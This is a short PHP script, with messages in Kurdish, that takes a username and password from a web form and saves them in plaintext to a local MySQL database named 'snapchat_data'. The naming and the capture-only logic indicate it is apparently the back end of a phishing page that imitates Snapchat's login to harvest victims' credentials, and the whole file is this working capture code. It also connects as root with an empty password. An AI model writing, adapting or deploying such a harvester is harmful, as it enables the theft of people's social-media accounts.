<?php
$host = 'localhost';
$db   = 'snapchat_data';
$user = 'root';
$pass = '';

$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
    die("پەیوەندی شکستی هێنا: " . $conn->connect_error);
}

$username = $_POST['username'];
$password = $_POST['password'];

$sql = "INSERT INTO logins (username, password) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $username, $password);

if ($stmt->execute()) {
    echo "زانیاریەکان بەسەرکەوتوویی تۆمار کران";
} else {
    echo "هەڵەیەک ڕوویدا: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
